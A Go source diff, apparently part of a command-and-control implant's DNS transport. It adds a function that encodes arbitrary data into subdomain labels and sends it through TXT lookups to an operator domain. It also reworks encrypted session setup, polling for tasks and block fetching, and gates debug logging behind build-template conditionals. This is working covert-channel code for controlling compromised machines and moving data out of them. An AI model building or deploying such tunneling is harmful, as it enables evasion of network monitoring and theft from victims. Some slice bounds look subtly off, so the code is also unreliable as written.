@@ -28,12 +28,16 @@ import (
 )
 
 const (
+	dnsSendDomainSeg  = 63
+	dnsSendDomainStep = 189 // 63 * 3
+
+	sessionIDSize = 8
+
 	domainKeyMsg      = "_domainkey"
 	blockReqMsg       = "_b"
 	clearBlockMsg     = "_cb"
-	sessionMsg        = "s"
-	sessionInitMsg    = "_si"
-	sessionCleanupMsg = "_sc"
+	dataMsg           = "d"
+	sessionInitMsg    = "si"
 	sessionPollingMsg = "_sp"
 
 	domainKeySubdomain = "_domainkey"
@@ -66,27 +70,117 @@ type BlockReassembler struct {
 	Recv chan RecvBlock
 }
 
+func dnsLookup(domain string) error {
+	// {{if .Debug}}
+	log.Printf("[dns] lookup -> %s", domain)
+	// {{end}}
+	txts, err := net.LookupTXT(domain)
+	if err != nil || len(txts) == 0 {
+		// {{if .Debug}}
+		log.Printf("[!] failure -> %s", domain)
+		// {{end}}
+		return err
+	}
+	return nil
+}
+
+// Send raw bytes of an arbitrary length to the server
+func dnsSend(parentDomain string, msgType string, data []byte) error {
+
+	encoded := dnsEncodeToString(data)
+	size := int(math.Ceil(float64(len(encoded)) / float64(dnsSendDomainStep)))
+	// {{if .Debug}}
+	log.Printf("Encoded message length is: %d (size = %d)", len(encoded), size)
+	// {{end}}
+
+	nonce := dnsNonce(32) // Larger nonce for this use case
+
+	// DNS domains are limited to 254 characters including '.' so that means:
+	// 63 * 3 = 189 (+ 3 '.') + metadata
+	// So we at max send 3 subdomain's containing data
+	for index := 0; index < size; index++ {
+		// {{if .Debug}}
+		log.Printf("Sending domain #%d of %d", index+1, size)
+		// {{end}}
+		start := index * dnsSendDomainStep
+		stop := start + dnsSendDomainStep
+		if len(encoded) <= stop {
+			stop = len(encoded) - 1
+		}
+		// {{if .Debug}}
+		log.Printf("Send data[%d:%d] %d bytes", start, stop, len(encoded[start:stop]))
+		// {{end}}
+		data := encoded[start:stop] // Total data we're about to send
+
+		subdomains := int(math.Ceil(float64(len(data)) / dnsSendDomainSeg))
+		// {{if .Debug}}
+		log.Printf("Subdata subdomains: %d", subdomains)
+		// {{end}}
+
+		subdata := []string{} // Break up into at most 3 subdomains
+		for dataIndex := 0; dataIndex < subdomains; dataIndex++ {
+			dataStart := dataIndex * dnsSendDomainSeg
+			dataStop := dataStart + dnsSendDomainSeg
+			if len(data) < dataStop {
+				dataStop = len(data) - 1
+			}
+			// {{if .Debug}}
+			log.Printf("Subdata #%d [%d:%d]: %#v", dataIndex, dataStart, dataStop, data[dataStart:dataStop])
+			// {{end}}
+			subdata = append(subdata, data[dataStart:dataStop])
+		}
+		// {{if .Debug}}
+		log.Printf("Encoded subdata: %#v", subdata)
+		// {{end}}
+
+		subdomain := strings.Join(subdata, ".")
+		pos := dnsEncodeToString(dnsDomainPosition(index, size))
+		domain := subdomain + fmt.Sprintf(".%s.%s.%s.%s", pos, nonce, msgType, parentDomain)
+		err := dnsLookup(domain)
+		if err != nil {
+			return err
+		}
+
+	}
+	// A domain with no data means it's the end of the message
+	domain := fmt.Sprintf("%s.%s.%s", nonce, msgType, parentDomain)
+	err := dnsLookup(domain)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+// Binary encoding of the current position of the data encoded into a domain
+func dnsDomainPosition(start int, stop int) []byte {
+	buf := new(bytes.Buffer)
+	binary.Write(buf, binary.LittleEndian, uint32(start))
+	binary.Write(buf, binary.LittleEndian, uint32(stop))
+	return buf.Bytes()
+}
+
 // --------------------------- DNS SESSION START ---------------------------
 
 func dnsStartSession(parentDomain string) (string, AESKey, error) {
 	sessionKey := RandomAESKey()
+	sessionID := dnsSessionID()
 	pubKey := dnsGetServerPublicKey()
 
-	data, err := RSAEncrypt(sessionKey[:], pubKey)
+	dnsSessionInit := &pb.DNSSessionInit{
+		SessionId: sessionID,
+		Key:       sessionKey[:],
+	}
+	data, _ := proto.Marshal(dnsSessionInit)
+	encryptedData, err := RSAEncrypt(data, pubKey)
 	if err != nil {
 		return "", AESKey{}, err
 	}
-	nonce := dnsNonce(nonceStdSize)
-	encoded := base32.StdEncoding.EncodeToString(data)
-	txts, err := net.LookupTXT(fmt.Sprintf("%s.%s.%s._si.%s", nonce, encoded, sliverName, parentDomain))
-	if 0 < len(txts) {
-		sessionID, err := GCMDecrypt(sessionKey, []byte(txts[0]))
-		if err != nil {
-			return "", AESKey{}, err
-		}
-		return string(sessionID), sessionKey, nil
+
+	err = dnsSend(parentDomain, sessionInitMsg, encryptedData)
+	if err != nil {
+		return "", AESKey{}, errors.New("Failed to start new DNS session")
 	}
-	return "", AESKey{}, errors.New("Invalid TXT response to session init")
+	return sessionID, sessionKey, nil
 }
 
 // Get the public key of the server
@@ -123,12 +217,17 @@ func dnsGetServerPublicKey() *rsa.PublicKey {
 func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
 	selector = strings.ToLower(selector)
 	nonce := dnsNonce(nonceStdSize)
-	subdomain := fmt.Sprintf("_%s.%s.%s.%s", nonce, selector, domainKeySubdomain, parentDomain)
-	txts, err := net.LookupTXT(subdomain)
+	domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, selector, domainKeySubdomain, parentDomain)
+	// {{if .Debug}}
+	log.Printf("[dns] lookup -> %s", domain)
+	// {{end}}
+	txts, err := net.LookupTXT(domain)
 	if err != nil {
 		return nil, err
 	}
+	// {{if .Debug}}
 	log.Printf("txts = %v err = %v", txts, err)
+	// {{end}}
 	if len(txts) == 0 {
 		return nil, errors.New("Invalid _domainkey response")
 	}
@@ -137,11 +236,15 @@ func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
 	if len(fields) < 2 {
 		return nil, errors.New("Invalid _domainkey response")
 	}
+	// {{if .Debug}}
 	log.Printf("Fetching Block ID = %s (Size = %s)", fields[0], fields[1])
+	// {{end}}
 	return getBlock(parentDomain, fields[0], fields[1])
 }
 
 // --------------------------- DNS SESSION SEND ---------------------------
+
+// Send a session message
 func dnsSessionSend(parentDomain string, sessionID string, sessionKey AESKey, envelope *pb.Envelope) error {
 	envelopeData, _ := proto.Marshal(envelope)
 	encryptedEnvelope, _ := GCMEncrypt(sessionKey, envelopeData)
@@ -153,7 +256,12 @@ func dnsSessionSend(parentDomain string, sessionID string, sessionKey AESKey, en
 	dnsBlockData, _ := proto.Marshal(dnsBlock)
 	encryptedDNSBlock := sessionEncrypt(sessionKey, dnsBlockData)
 	nonce := dnsNonce(nonceStdSize)
-	txts, err := net.LookupTXT(fmt.Sprintf("%s.%s.%s._sh.%s", nonce, encryptedDNSBlock, sessionID, parentDomain))
+
+	domain := fmt.Sprintf("%s.%s.%s._sh.%s", nonce, encryptedDNSBlock, sessionID, parentDomain)
+	// {{if .Debug}}
+	log.Printf("[dns] lookup -> %s", domain)
+	// {{end}}
+	txts, err := net.LookupTXT(domain)
 	if err != nil {
 		return err
 	} else if len(txts) < 1 || txts[0] == "1" {
@@ -173,6 +281,9 @@ func dnsSessionSend(parentDomain string, sessionID string, sessionKey AESKey, en
 
 		encoded := base32.StdEncoding.EncodeToString(data)
 		domain := fmt.Sprintf("%s.%s.%s.%s.s.%s", nonce, encoded, encryptedHeaderID, sessionID, parentDomain)
+		// {{if .Debug}}
+		log.Printf("[dns] lookup -> %s", domain)
+		// {{end}}
 		txts, err := net.LookupTXT(domain)
 		if err != nil {
 			return err
@@ -192,8 +303,11 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 			return
 		default:
 			nonce := dnsNonce(nonceStdSize)
-			subdomain := fmt.Sprintf("_%s.%s._sp.%s", nonce, sessionID, parentDomain)
-			txts, err := net.LookupTXT(subdomain)
+			domain := fmt.Sprintf("_%s.%s._sp.%s", nonce, sessionID, parentDomain)
+			// {{if .Debug}}
+			log.Printf("[dns] lookup -> %s", domain)
+			// {{end}}
+			txts, err := net.LookupTXT(domain)
 			if err != nil || len(txts) < 1 {
 				// {{if .Debug}}
 				log.Printf("Error while polling session %v", err)
@@ -234,7 +348,9 @@ func getSessionEnvelope(parentDomain string, sessionKey AESKey, blockPtr *pb.DNS
 	}
 	envelopeData, err := GCMDecrypt(sessionKey, blockData)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("Failed to decrypt block with id = %s", blockPtr.Id)
+		// {{end}}
 		return nil
 	}
 	envelope := &pb.Envelope{}
@@ -288,7 +404,13 @@ func getBlock(parentDomain string, blockID string, size string) ([]byte, error) 
 		msg = append(msg, buf...)
 	}
 	nonce := dnsNonce(nonceStdSize)
-	go net.LookupTXT(fmt.Sprintf("%s.%s._cb.%s", nonce, reasm.ID, parentDomain))
+	go func() {
+		domain := fmt.Sprintf("%s.%s._cb.%s", nonce, reasm.ID, parentDomain)
+		// {{if .Debug}}
+		log.Printf("[dns] lookup -> %s", domain)
+		// {{end}}
+		net.LookupTXT(domain)
+	}()
 	return msg, nil
 }
 
@@ -296,12 +418,19 @@ func getBlock(parentDomain string, blockID string, size string) ([]byte, error) 
 func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, stop int, wg *sync.WaitGroup) {
 	defer wg.Done()
 	nonce := dnsNonce(nonceStdSize)
-	subdomain := fmt.Sprintf("_%s.%d.%d.%s._b.%s", nonce, start, stop, reasm.ID, parentDomain)
-	log.Printf("[dns] fetch -> %s", subdomain)
-	txts, err := net.LookupTXT(subdomain)
+	domain := fmt.Sprintf("_%s.%d.%d.%s._b.%s", nonce, start, stop, reasm.ID, parentDomain)
+	// {{if .Debug}}
+	log.Printf("[dns] fetch -> %s", domain)
+	// {{end}}
+	txts, err := net.LookupTXT(domain)
+	// {{if .Debug}}
 	log.Printf("[dns] fetched %d txt record(s)", len(txts))
+	// {{end}}
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("Failed to fetch blocks %v", err)
+		// {{end}}
+		return
 	}
 	for _, txt := range txts {
 		// Split on delim '.' because Windows strcat's multiple TXT records
@@ -309,20 +438,28 @@ func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, sto
 			if len(record) == 0 {
 				continue
 			}
+			// {{if .Debug}}
 			log.Printf("Decoding TXT record: %s", record)
+			// {{end}}
 			rawBlock, err := base64.RawStdEncoding.DecodeString(record)
 			if err != nil {
+				// {{if .Debug}}
 				log.Printf("Failed to decode raw block '%s'", rawBlock)
+				// {{end}}
 				continue
 			}
 			if len(rawBlock) < 4 {
+				// {{if .Debug}}
 				log.Printf("Invalid raw block size %d", len(rawBlock))
+				// {{end}}
 				continue
 			}
 			seqBuf := make([]byte, 4)
 			copy(seqBuf, rawBlock[:4])
 			seq := int(binary.LittleEndian.Uint32(seqBuf))
+			// {{if .Debug}}
 			log.Printf("seq = %d (%d bytes)", seq, len(rawBlock[4:]))
+			// {{end}}
 			reasm.Recv <- RecvBlock{
 				Index: seq,
 				Data:  rawBlock[4:],
@@ -332,6 +469,18 @@ func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, sto
 }
 
 // --------------------------- HELPERS ---------------------------
+
+// SessionIDs are public parameters in this use case
+// so it's only important that they're unique
+func dnsSessionID() string {
+	insecureRand.Seed(time.Now().UnixNano())
+	sessionID := []rune{}
+	for i := 0; i < sessionIDSize; i++ {
+		index := insecureRand.Intn(len(dnsCharSet))
+		sessionID = append(sessionID, dnsCharSet[index])
+	}
+	return "_" + string(sessionID)
+}
 
 func dnsBlockHeaderID() string {
 	insecureRand.Seed(time.Now().UnixNano())
@@ -357,5 +506,29 @@ func dnsNonce(size int) string {
 // Wrapper around GCMEncrypt & Base32 encode
 func sessionEncrypt(sessionKey AESKey, data []byte) string {
 	encryptedData, _ := GCMEncrypt(sessionKey, data)
-	return base32.StdEncoding.EncodeToString(encryptedData)
+	return dnsEncodeToString(encryptedData)
+}
+
+// --------------------------- ENCODER ---------------------------
+var base32Alphabet = "0123456789abcdefghjkmnpqrtuvwxyz"
+var lowerBase32 = base32.NewEncoding(base32Alphabet)
+
+// EncodeToString encodes the given byte slice in base32
+func dnsEncodeToString(in []byte) string {
+	return strings.TrimRight(lowerBase32.EncodeToString(in), "=")
+}
+
+// DecodeString decodes the given base32 encodeed bytes
+func dnsDecodeString(raw string) ([]byte, error) {
+	pad := 8 - (len(raw) % 8)
+	nb := []byte(raw)
+	if pad != 8 {
+		nb = make([]byte, len(raw)+pad)
+		copy(nb, raw)
+		for index := 0; index < pad; index++ {
+			nb[len(raw)+index] = '='
+		}
+	}
+
+	return lowerBase32.DecodeString(string(nb))
 }
